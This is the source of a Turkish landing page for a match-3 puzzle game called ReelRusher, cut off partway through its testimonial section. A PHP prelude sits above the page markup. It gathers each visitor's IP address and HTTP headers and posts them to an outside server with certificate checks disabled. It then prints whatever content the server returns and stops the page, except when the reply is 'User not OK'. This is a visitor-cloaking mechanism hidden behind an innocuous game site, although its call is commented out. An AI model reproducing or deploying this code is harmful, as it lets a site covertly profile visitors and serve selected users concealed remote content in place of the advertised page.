﻿<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'TR';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!DOCTYPE html>
<html lang="tr">

<head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="ReelRusher - Eğlenceli Match-3 ve Zuma tarzı bulmaca oyunu">
   <meta name="robots" content="index, follow">

   <meta property="og:title" content="ReelRusher - Match-3 Bulmaca Oyunu">
   <meta property="og:description" content="En heyecanverici Match-3 ve Zuma hibrit bulmaca oyunu. Piramit şeklindeki tahtada renkli taşları eşleştir ve eğlen!">
   <meta property="og:image" content="https://reelrusher.com/assets/6-BJrEYN0P.png">
   <meta property="og:url" content="https://reelrusher.com/">
   <meta property="og:type" content="website">
   <meta property="og:site_name" content="ReelRusher">
   <meta property="og:locale" content="tr_TR">

   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="ReelRusher - Match-3 Bulmaca Oyunu">
   <meta name="twitter:description" content="En heyecanverici Match-3 ve Zuma hibrit bulmaca oyunu. Piramit şeklindeki tahtada renkli taşları eşleştir ve eğlen!">
   <meta name="twitter:image" content="https://reelrusher.com/assets/6-BJrEYN0P.png">
   <meta name="twitter:site" content="@reelrusher">
   <meta name="twitter:creator" content="@reelrusher">

   <title>Ana Sayfa | ReelRusher - Match-3 Bulmaca Oyunu</title>
   <link rel="shortcut icon" href="assets/favicon.png" type="image/png">
  <script src="assets/gclid-tracker.js"></script>
  <script type="module" crossorigin src="assets/main-DwB1b1zN.js"></script>
  <script src="assets/cookie-consent.js"></script>
  <link rel="stylesheet" crossorigin href="assets/main-B9xypkzf.css">
  <link rel="stylesheet" href="assets/cookie-consent.css">
</head>

<body>
   <div class="preloader" id="preloader">
      <div class="spinner-grow" role="status">
         <span class="visually-hidden">Yükleniyor...</span>
      </div>
   </div>
 
   <header class="header-area">
      <div class="header-top">
         <div class="container h-100">
            <div class="h-100 d-flex align-items-center justify-content-between">
                    <div class="left-side d-flex align-items-center gap-2 gap-md-3 gap-lg-4">
                     <div class="d-flex align-items-center gap-1">
                       <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18" fill="none">
                        <path d="M15 13.5H13.5V6.9375L9 9.75L4.5 6.9375V13.5H3V4.5H3.9L9 7.6875L14.1 4.5H15M15 3H3C2.1675 3 1.5 3.6675 1.5 4.5V13.5C1.5 13.8978 1.65804 14.2794 1.93934 14.5607C2.22064 14.842 2.60218 15 3 15H15C15.3978 15 15.7794 14.842 16.0607 14.5607C16.342 14.2794 16.5 13.8978 16.5 13.5V4.5C16.5 4.10218 16.342 3.72064 16.0607 3.43934C15.7794 3.15804 15.3978 3 15 3Z" fill="white"></path>
                       </svg>
                       <a href="mailto:info@reelrusher.com" style="text-decoration:none;color:inherit;">
                        <span class="d-none d-lg-block">info@reelrusher.com</span>
                       </a>
                     </div>

                     <div class="d-flex align-items-center gap-1">
                       <svg xmlns="http://www.w3.org/2000/svg" width="11" height="18" viewbox="0 0 11 18" fill="none">
                        <path d="M5.5 0C4.04131 0 2.64236 0.592632 1.61091 1.64752C0.579463 2.70242 0 4.13316 0 5.625C0 11.25 5.5 18 5.5 18C5.5 18 11 11.25 11 5.625C11 4.13316 10.4205 2.70242 9.38909 1.64752C8.35764 0.592632 6.95869 0 5.5 0ZM5.5 9.07088C5.05754 9.07088 4.61941 8.98174 4.21063 8.80857C3.80184 8.6354 3.43041 8.38158 3.11754 8.0616C2.80468 7.74162 2.5565 7.36175 2.38717 6.94368C2.21785 6.52561 2.1307 6.07752 2.1307 5.625C2.1307 5.17248 2.21785 4.72439 2.38717 4.30632C2.5565 3.88825 2.80468 3.50838 3.11754 3.1884C3.43041 2.86842 3.80184 2.6146 4.21063 2.44143C4.61941 2.26825 5.05754 2.17913 5.5 2.17913C6.39359 2.17913 7.25059 2.54217 7.88245 3.1884C8.51432 3.83463 8.8693 4.7111 8.8693 5.625C8.8693 6.5389 8.51432 7.41537 7.88245 8.0616C7.25059 8.70783 6.39359 9.07088 5.5 9.07088ZM3.3693 5.625C3.3693 5.04676 3.5939 4.49221 3.99369 4.08333C4.39348 3.67445 4.93571 3.44475 5.5011 3.44475C6.06649 3.44475 6.60872 3.67445 7.00851 4.08333C7.4083 4.49221 7.6329 5.04676 7.6329 5.625C7.6329 6.20324 7.4083 6.75779 7.00851 7.16667C6.60872 7.57555 6.06649 7.80525 5.5011 7.80525C4.93571 7.80525 4.39348 7.57555 3.99369 7.16667C3.5939 6.75779 3.3693 6.20324 3.3693 5.625Z" fill="white"></path>
                       </svg>
                       <a href="https://maps.app.goo.gl/CN7pgEZa4qJN335a7" target="_blank" style="text-decoration:none;color:inherit;">
                        <span class="d-none d-lg-block">İstanbul, Türkiye</span>
                       </a>
                     </div>

                     <div class="d-flex align-items-center gap-1">
                       <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18" fill="none">
                        <path d="M14.9625 15.75C13.4 15.75 11.8562 15.4092 10.3312 14.7277C8.80625 14.0462 7.41875 13.0807 6.16875 11.8312C4.91875 10.5813 3.95325 9.19375 3.27225 7.66875C2.59125 6.14375 2.2505 4.6 2.25 3.0375C2.25 2.8125 2.325 2.625 2.475 2.475C2.625 2.325 2.8125 2.25 3.0375 2.25H6.075C6.25 2.25 6.40625 2.3095 6.54375 2.4285C6.68125 2.5475 6.7625 2.688 6.7875 2.85L7.275 5.475C7.3 5.675 7.29375 5.84375 7.25625 5.98125C7.21875 6.11875 7.15 6.2375 7.05 6.3375L5.23125 8.175C5.48125 8.6375 5.778 9.08425 6.1215 9.51525C6.465 9.94625 6.84325 10.362 7.25625 10.7625C7.64375 11.15 8.05 11.5095 8.475 11.841C8.9 12.1725 9.35 12.4755 9.825 12.75L11.5875 10.9875C11.7 10.875 11.847 10.7905 12.0285 10.734C12.21 10.6775 12.388 10.662 12.5625 10.6875L15.15 11.2125C15.325 11.2625 15.4688 11.3532 15.5812 11.4847C15.6937 11.6163 15.75 11.763 15.75 11.925V14.9625C15.75 15.1875 15.675 15.375 15.525 15.525C15.375 15.675 15.1875 15.75 14.9625 15.75ZM4.51875 6.75L5.75625 5.5125L5.4375 3.75H3.76875C3.83125 4.2625 3.91875 4.76875 4.03125 5.26875C4.14375 5.76875 4.30625 6.2625 4.51875 6.75ZM11.2313 13.4625C11.7188 13.675 12.2157 13.8438 12.7222 13.9688C13.2287 14.0938 13.738 14.175 14.25 14.2125V12.5625L12.4875 12.2062L11.2313 13.4625Z" fill="white"></path>
                       </svg>
                       <a href="tel:+905324176488" style="text-decoration:none;color:inherit;">
                        <span class="d-none d-lg-block">+90 532 417 64 88</span>
                       </a>
                     </div>
                    </div>
             
            </div>
         </div>
      </div>

      <div class="container">
         <nav class="navbar navbar-expand-xl">
            <a class="navbar-brand" href="/">
               <img src="assets/nav-brand.png" alt="ReelRusher" style="width: auto; height: 60px;">
            </a>

            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#fandiNav" aria-controls="fandiNav" aria-expanded="false" aria-label="Toggle navigation">
               <i class="ti ti-menu-deep"></i>
            </button>

            <div class="collapse navbar-collapse justify-content-end" id="fandiNav">
               <ul class="navbar-nav align-items-xl-center navbar-nav-scroll mt-4 mt-xl-0">
                  <li class="active">
                     <a href="/">Ana Sayfa</a>
                  </li>
                  <li class="fandi-dd">
                     <a href="#">Oyun Hakkında <i class="ti ti-chevron-down"></i></a>
                     <ul class="fandi-dd-menu">
                        <li>
                           <a href="mechanics.html">Oyun Mekanikleri</a>
                        </li>
                        <li>
                           <a href="game-art.html">Oyun Sanatı ve Kapaklar</a>
                        </li>
                        <li>
                           <a href="team.html">Geliştirici Ekibi</a>
                        </li>
                        <li>
                           <a href="technology.html">Teknoloji ve Platformlar</a>
                        </li>
                     </ul>
                  </li>
                  <li>
                     <a href="roadmap.html">Geliştirme Yol Haritası</a>
                  </li>
                  <li>
                     <a href="about-us.html">Hakkımızda</a>
                  </li>
                  <li>
                     <a href="contact.html">İletişim</a>
                  </li>
               </ul>

            </div>
         </nav>
      </div>
   </header>

    <section class="hero-section">
      <div class="container">
         <div class="row align-items-center g-5">
            <div class="col-12 col-lg-7 mb-5">
               <div class="hero-content">
                 <h2 class="text-white mb-4 wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1000ms">En
                   Heyecanverici
                   Match-3 Bulmaca Deneyimi</h2>
                 <p class="text-white wow fadeInUp" data-wow-delay="800ms" data-wow-duration="1000ms">Piramit şeklindeki tahtada renkli taşları sıralayın. Match-3 ve Zuma oyun mekaniğini birleştiren farklı bir oyun deneyimi.</p>
                 <a href="contact.html" class="btn btn-primary wow fadeInUp" data-wow-delay="1000ms" data-wow-duration="1000ms">
                   <span>Hemen Oyna <i class="ti ti-arrow-up-right"></i></span>
                   <span>Hemen Oyna <i class="ti ti-arrow-up-right"></i></span>
                 </a>
               </div>
            </div>

            <div class="col-12 col-lg-5">
               <div class="hero-image wow fadeInUp" data-wow-delay="1200ms" data-wow-duration="1000ms">
                  <img src="assets/6-BJrEYN0P.png" alt="">

                  <div class="hero-popup popup-one d-inline-flex align-items-center gap-2">
                     <div class="icon">
                       
                     </div>
                     <div>
                        <h4 class="mb-0">100+</h4>
                        <p class="mb-0">Seviye</p>
                     </div>
                  </div>

               
               </div>
            </div>
         </div>
      </div>
   </section>

   <section class="service-section">
      <div class="divider"></div>

      <div class="container">
         <div class="row justify-content-center">
            <div class="col-12 col-lg-7">
               <div class="section-heading text-center">
                  <h2 class="mb-0">Oyunun Benzersiz Özellikleri</h2>
               </div>
            </div>
         </div>
      </div>

      <div class="divider-sm"></div>

      <div class="container">
         <div class="row g-4">
            <div class="col-12 col-sm-6 col-lg-4">
               <div class="service-card">
                  <img src="assets/20-VG_sK4Ya.jpg" alt="">
                  <div class="service-content">
                     <h4><a class="service-title" href="game-mechanics.html">Match-3 Mekanikleri</a></h4>
                     <p class="mb-0">Renkli taşları bir araya getirerek puan kazanabilirsiniz. Klasik match-3 oyununun yaratıcı bir uyarlaması ile karşınızda.</p>
                  </div>
               </div>
            </div>

            <div class="col-12 col-sm-6 col-lg-4">
               <div class="service-card">
                  <img src="assets/21-CkUMS-6D.jpg" alt="">
                  <div class="service-content">
                     <h4><a class="service-title" href="game-mechanics.html">Piramit Tahta</a></h4>
                     <p class="mb-0">Bu benzersiz piramit şeklindeki oyun tahtası, stratejik düşünme yeteneğinizi geliştirmek ve eğlenmek için tasarlanmıştır.</p>
                  </div>
               </div>
            </div>

            <div class="col-12 col-sm-6 col-lg-4">
               <div class="service-card">
                  <img src="assets/22-tM_v1lay.jpg" alt="">
                  <div class="service-content">
                     <h4><a class="service-title" href="technology.html">Çoklu Platform</a></h4>
                     <p class="mb-0">Mobil ve masaüstü tarayıcılarda sorunsuz oynayın. Her zaman nerede olursanız olun erişilebilir.</p>
                  </div>
               </div>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="about-section bg-secondary">
      <div class="divider"></div>

      <div class="container">
         <div class="row align-items-center g-4 g-lg-5">
            <div class="col-12 col-md-6">
               <div class="about-img pe-xl-5">
                  <img src="assets/19-CZsw6Nxy.jpg" alt="">
               </div>
            </div>

            <div class="col-12 col-md-6">
               <div class="about-content">
                  <div class="section-heading">
                     <h2 class="mb-3">Oyun Dünyasını Yeniden Şekillendiriyoruz</h2>
                     <p class="mb-5">Yılların deneyimi ile geliştirdiğimiz ReelRusher, bulmaca oyunu severlerin hayallerini gerçeğe dönüştürür.
                        WebGL ve Unity teknolojileri kullanılarak geliştirilen oyunumuz, herhangi bir tarayıcıda yüksek performansla çalışır.  Mobil cihazlardan masaüstü bilgisayarlara kadar tüm platformlarda sorunsuz ve hızlı bir şekilde oynanabilir.</p>
                        <p class="mb-5">ReelRusher, klasik eşleştirme oyunlarını yeni bir boyuta taşıyan bir oyundur.  Piramit şeklindeki oyun tahtası, oyunculara strateji ve hızlı refleksleri birleştiren renkli kürelerle dolu bir deneyim sunar.</p>
                        <p class="mb-5"></p>ReelRusher, yalnızca bir oyun değil, aynı zamanda bir topluluktur.  Oyuncular, ilerlemeye katkıda bulunabilir, geri bildirim verebilir ve erken erişim avantajlarından yararlanabilir..</p>
                     <ul class="about-list">
                        <li>
                           <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28" fill="none">
                              <path d="M12.1473 23.354C12.144 23.354 12.1402 23.354 12.1369 23.354C12.0013 23.3512 11.8733 23.2932 11.7814 23.1937L2.40471 12.9978C2.24392 12.8228 2.22916 12.5592 2.36971 12.3672C2.51025 12.1758 2.76619 12.1102 2.98166 12.2108L11.5638 16.2293C11.636 16.2632 11.7213 16.2468 11.7765 16.1893L24.8676 2.50708C25.0448 2.32169 25.3346 2.30145 25.5359 2.46114C25.7371 2.62083 25.7836 2.90739 25.6431 3.12231L12.6209 23.0712C12.6023 23.1002 12.5804 23.1265 12.5563 23.1511L12.4989 23.2085C12.4054 23.3015 12.2785 23.354 12.1473 23.354Z" fill="#011832"></path>
                           </svg>
                           100+ Zorlu Seviye
                        </li>
                        <li>
                           <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28" fill="none">
                              <path d="M12.1473 23.354C12.144 23.354 12.1402 23.354 12.1369 23.354C12.0013 23.3512 11.8733 23.2932 11.7814 23.1937L2.40471 12.9978C2.24392 12.8228 2.22916 12.5592 2.36971 12.3672C2.51025 12.1758 2.76619 12.1102 2.98166 12.2108L11.5638 16.2293C11.636 16.2632 11.7213 16.2468 11.7765 16.1893L24.8676 2.50708C25.0448 2.32169 25.3346 2.30145 25.5359 2.46114C25.7371 2.62083 25.7836 2.90739 25.6431 3.12231L12.6209 23.0712C12.6023 23.1002 12.5804 23.1265 12.5563 23.1511L12.4989 23.2085C12.4054 23.3015 12.2785 23.354 12.1473 23.354Z" fill="#011832"></path>
                           </svg>
                           Benzersiz Oyun Mekaniği
                        </li>
                        <li>
                           <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28" fill="none">
                              <path d="M12.1473 23.354C12.144 23.354 12.1402 23.354 12.1369 23.354C12.0013 23.3512 11.8733 23.2932 11.7814 23.1937L2.40471 12.9978C2.24392 12.8228 2.22916 12.5592 2.36971 12.3672C2.51025 12.1758 2.76619 12.1102 2.98166 12.2108L11.5638 16.2293C11.636 16.2632 11.7213 16.2468 11.7765 16.1893L24.8676 2.50708C25.0448 2.32169 25.3346 2.30145 25.5359 2.46114C25.7371 2.62083 25.7836 2.90739 25.6431 3.12231L12.6209 23.0712C12.6023 23.1002 12.5804 23.1265 12.5563 23.1511L12.4989 23.2085C12.4054 23.3015 12.2785 23.354 12.1473 23.354Z" fill="#011832"></path>
                           </svg>
                           Ücretsiz Oyna
                        </li>
                     </ul>

                     <div class="d-flex flex-wrap align-items-center gap-5 mt-5">
                        <!-- Button -->
                        <a href="about-us.html" class="btn btn-primary">
                           <span>Daha Fazlası <i class="ti ti-arrow-up-right"></i></span>
                           <span>Daha Fazlası <i class="ti ti-arrow-up-right"></i></span>
                        </a>

                      
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="cool-facts-section bg-primary">
      <div class="divider"></div>

      <div class="container">
         <div class="row align-items-center g-5">
            <div class="col-12 col-sm-6 col-md-4">
               <div class="cool-fact-card wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1000ms">
                  <h2 class="mb-0"><span class="counter">100</span>+</h2>
                  <div class="line"></div>
                  <p class="mb-0">Toplam seviye<br>sayısı</p>
               </div>
            </div>

            <div class="col-12 col-sm-6 col-md-4">
               <div class="cool-fact-card wow fadeInUp" data-wow-delay="800ms" data-wow-duration="1000ms">
                  <h2 class="mb-0"><span class="counter">10</span>K+</h2>
                  <div class="line"></div>
                  <p class="mb-0">Memnun<br>oyuncu</p>
               </div>
            </div>

            <div class="col-12 col-sm-6 col-md-4">
               <div class="cool-fact-card wow fadeInUp" data-wow-delay="1000ms" data-wow-duration="1000ms">
                  <h2 class="mb-0"><span class="counter">4.8</span>*</h2>
                  <div class="line"></div>
                  <p class="mb-0">Ortalama<br>değerlendirme</p>
               </div>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="project-section">
      <div class="divider"></div>

      <div class="container">
         <div class="row g-4 align-items-end ">
            <div class="col-12 col-sm-7">
               <div class="section-heading">
                  <h2 class="mb-0">Oyun Ekran Görüntüleri</h2>
               </div>
            </div>

            <div class="col-12 col-sm-5">
               <div class="text-sm-end">
                  <div class="swiper-navigation-container project-swiper-navigation">
                     <div class="project-button-prev">
                        <i class="ti ti-arrow-narrow-left"></i>
                     </div>

                     <div class="project-button-next">
                        <i class="ti ti-arrow-narrow-right"></i>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>

      <div class="divider-sm"></div>

      <div class="container">
         <div class="swiper project-swiper" id="projectSwiper">
            <div class="swiper-wrapper">
               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/23-CYQMHx5U.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Ana Oyun Ekranı</h4>
                        <p class="mb-0 text-white">Oyun Mekaniği</p>
                     </div>
                  </div>
               </a>

               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/25-BAVwUyjr.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Bonus Seviyeler</h4>
                        <p class="mb-0 text-white">Özel İçerik</p>
                     </div>
                  </div>
               </a>

               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/27-B3OWt_NY.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Skor Sistemi</h4>
                        <p class="mb-0 text-white">Rekabetçi Oyun</p>
                     </div>
                  </div>
               </a>

               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/78-Bpe5uDBP.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Oyun İçi Görünüm</h4>
                        <p class="mb-0 text-white">Oynanış Sahnesi</p>
                     </div>
                  </div>
               </a>

               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/80-DrNTnYrx.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Özel Güç Efektleri</h4>
                        <p class="mb-0 text-white">Görsel Efektler</p>
                     </div>
                  </div>
               </a>

               <a href="game-art.html" class="swiper-slide">
                  <div class="project-card">
                     <img src="assets/81-BinJL4Vy.jpg" alt="">
                     <div class="project-content">
                        <h4 class="text-white">Seviye Haritaları</h4>
                        <p class="mb-0 text-white">Oyun Haritası</p>
                     </div>
                  </div>
               </a>
            </div>
         </div>
      </div>
      <div class="divider"></div>
   </section>

   <section class="newsletter-section">
      <div class="container">
         <div class="newsletter-card">
            <div class="row g-5 align-items-center">
               <div class="col-12 col-md-6">
                  <div class="section-heading">
                     <h2 class="mb-3 text-white wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1000ms">
                        Erken Erişim İçin Kaydol</h2>
                     <p class="mb-0 text-white wow fadeInUp" data-wow-delay="800ms" data-wow-duration="1000ms">
                        Güncellemeler hakkında bilgi edinmek ve erken seçim sürümüne erişmek için e-posta listesine katılın.</p>
                  </div>
               </div>
               <div class="col-12 col-md-6">
                  <form action="#" class="newsletter-form wow fadeInUp" data-wow-delay="1000ms" data-wow-duration="1000ms" id="newsletterForm">
                     <input class="form-control" type="email" placeholder="E-posta Adresin" id="emailInput" required>
                     <button class="btn btn-primary" type="submit">
                        <span>Kaydol <i class="ti ti-arrow-up-right d-none d-md-block"></i></span>
                        <span>Kaydol <i class="ti ti-arrow-up-right d-none d-md-block"></i></span>
                     </button>
                  </form>
               </div>
            </div>
         </div>
      </div>
   </section>

   <section class="service-section bg-secondary">
      <div class="divider"></div>

      <div class="container">
         <div class="row justify-content-center">
            <div class="col-12 col-lg-7">
               <div class="section-heading text-center">
                  <h2 class="mb-0">Oyun Başarısı İçin Basit Adımlar</h2>
               </div>
            </div>
         </div>
      </div>

      <div class="divider-sm"></div>

      <div class="container">
         <div class="row g-4">
            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="400ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-rocket"></i>
                  </div>
                  <div>
                     <h5>Hızlı Başlangıç</h5>
                     <p class="mb-4">Oyunumuz basit, ancak ustalaşmak zor.  Oyuna başla ve yeteneklerini keşfet..</p>
                     <a href="game-mechanics.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>

            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="500ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-shield-check"></i>
                  </div>
                  <div>
                     <h5>Güvenli Oyna</h5>
                     <p class="mb-4">İlerleme kayıtlarının güvende tutulması.  Oyun verilerini kaybetmekten korkmayın.</p>
                     <a href="technology.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>

            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-trophy"></i>
                  </div>
                  <div>
                     <h5>Başarım Sistemi</h5>
                     <p class="mb-4">Hedefleri tamamla, rozetler kazan ve arkadaşlarınızla karşılaştır.  Her başarı yeni bir zorluk getirir.</p>
                     <a href="game-mechanics.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>
            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="700ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-headset"></i>
                  </div>
                  <div>
                     <h5>Teknik Destek</h5>
                     <p class="mb-4">Herhangi bir sorunla karşılaştığında destek ekibimiz hizmetinizdedir.  Yardıma her zaman hazırız.</p>
                     <a href="contact.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>
            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="800ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-lock"></i>
                  </div>
                  <div>
                     <h5>Yüksek Güvenlik</h5>
                     <p class="mb-4">Oyun verilerinin ve kişisel verilerinin güvenliği için en yeni teknolojiyi kullanıyoruz.</p>
                     <a href="technology.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>
            <div class="col-12 col-md-6 col-lg-4">
               <div class="service-card-two wow fadeInUp" data-wow-delay="900ms" data-wow-duration="1000ms">
                  <div class="icon">
                     <i class="ti ti-users"></i>
                  </div>
                  <div>
                     <h5>Topluluk Desteği</h5>
                     <p class="mb-4">Oyun topluluğuna katıl, diğer oyuncularla bağlantı kur ve ipuçları paylaş.</p>
                     <a href="contact.html" class="btn btn-link">
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                        <span>Daha Fazla <i class="ti ti-arrow-right"></i></span>
                     </a>
                  </div>
               </div>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="team-section">
      <div class="divider"></div>

      <div class="container">
         <div class="row align-items-end g-5">
            <div class="col-12 col-sm-6">
               <div class="section-heading">
                  <h2 class="mb-0">Geliştirici Ekibimiz</h2>
               </div>
            </div>

            <div class="col-12 col-sm-6">
               <div class="text-sm-end">
                  <a href="team.html" class="btn btn-primary">
                     <span>Tüm Ekip <i class="ti ti-arrow-up-right"></i></span>
                     <span>Tüm Ekip <i class="ti ti-arrow-up-right"></i></span>
                  </a>
               </div>
            </div>
         </div>
      </div>

      <div class="divider-sm"></div>

      <div class="container">
         <div class="row g-4">
            <div class="col-12 col-sm-6 col-lg-4">
               <div class="team-card wow fadeInUp" data-wow-delay="500ms" data-wow-duration="1000ms">
                  <div class="team-img">
                     <img src="assets/14-DFPFDhm1.jpg" alt="">
                     
                  </div>
                  <div class="team-content text-center my-4">
                     <h4><a class="member-title" href="team.html">Ahmet Yılmaz</a></h4>
                     <p class="mb-0">Baş Geliştirici</p>
                  </div>
               </div>
            </div>
            <div class="col-12 col-sm-6 col-lg-4">
               <div class="team-card wow fadeInUp" data-wow-delay="700ms" data-wow-duration="1000ms">
                  <div class="team-img">
                     <img src="assets/15-DxFns-_C.jpg" alt="">
                     
                  </div>
                  <div class="team-content text-center my-4">
                     <h4><a class="member-title" href="team.html">Ayşe Kaya</a></h4>
                     <p class="mb-0">Oyun Tasarımcısı</p>
                  </div>
               </div>
            </div>

            <div class="col-12 col-sm-6 col-lg-4">
               <div class="team-card wow fadeInUp" data-wow-delay="900ms" data-wow-duration="1000ms">
                  <div class="team-img">
                     <img src="assets/16-CMuRH3-k.jpg" alt="">
                   
                  </div>
                  <div class="team-content text-center my-4">
                     <h4><a class="member-title" href="team.html">Mehmet Demir</a></h4>
                     <p class="mb-0">Sanat Yönetmeni</p>
                  </div>
               </div>
            </div>

         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="testimonial-section bg-secondary">
      <div class="divider"></div>

      <div class="container">
         <div class="row g-5 align-items-center">
            <div class="col-12 col-md-6">
               <div class="swiper testimonial-swiper-one">
                  <div class="swiper-wrapper">
                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                        
                           </div>
                           <p class="testimonial-text">"ReelRusher, oynamaktan gerçekten keyif alan bir oyun!  Match-3 oyunlarını seviyorum ama daha önce hiç bu kadar yenilikçi bir yaklaşım görmedim.  Piramit tahtası çok yaratıcı; her seviye size yeni zorluklar sunuyor.  Ayrıca arkadaşlarıma tavsiye ettim."</p>
                           <hr>
                          
                        </div>
                     </div>

                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                          
                           </div>
                           <p class="testimonial-text">"Başlangıçta basit görünse de oyun ilerledikçe daha derinlikli hale geliyor.  Strateji gerektiren seviyeler ve oyunun farklı mekaniğinin bir sonucu olarak saatlerce oynayabiliyorum.  Mobil ve masaüstü versiyonları aynı kalitede çalışıyor."</p>
                           <hr>
                        
                        </div>
                     </div>

                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                           
                           </div>
                           <p class="testimonial-text">"Bulmaca oynamayı sevenler bu yapımı mutlaka denemelidir.  Oyunun grafikleri, ses efektleri ve pürüzsüz akışı harika.  Oyuncu olarak, her gün yeni seviyelerin eklenmesi beni çok mutlu ediyor."</p>
                           <hr>
                         
                        </div>
                     </div>

                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                           
                           </div>
                           <p class="testimonial-text">"Bu Unity tabanlı oyun son derece etkileyici.  Mobil ve web tarayıcısında sorunsuz çalışıyor.  Piramit şeklindeki oyun tahtası son derece yenilikçi bir yaklaşımdır ve her seviye farklı bir strateji gerektirir."</p>
                           <hr>
                       
                        </div>
                     </div>

                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                           
                           </div>
                           <p class="testimonial-text">"Bu benim çocuklarımla oynayabileceğim eğlenceli bir oyun.  Eğlenceli olduğu kadar zeka geliştirici.  Kullanıcı dostu arayüzü ve renkli tasarımı sayesinde tüm yaş gruplarına hitap ediyor."</p>
                           <hr>
                          
                        </div>
                     </div>

                     <div class="swiper-slide">
                        <div class="testimonial-card">
                           <div class="quote-icon">
                           
                           </div>
                           <p class="testimonial-text">"Oyun performansı harika.  Yüklemeler hızlı ve hiçbir sorun yaşamadım.  Geliştiriciler harika bir iş çıkardılar."</p>
                           <hr>
                         
                        </div>
                     </div>
                  </div>

                  <div class="testimonial-swiper-navigation">
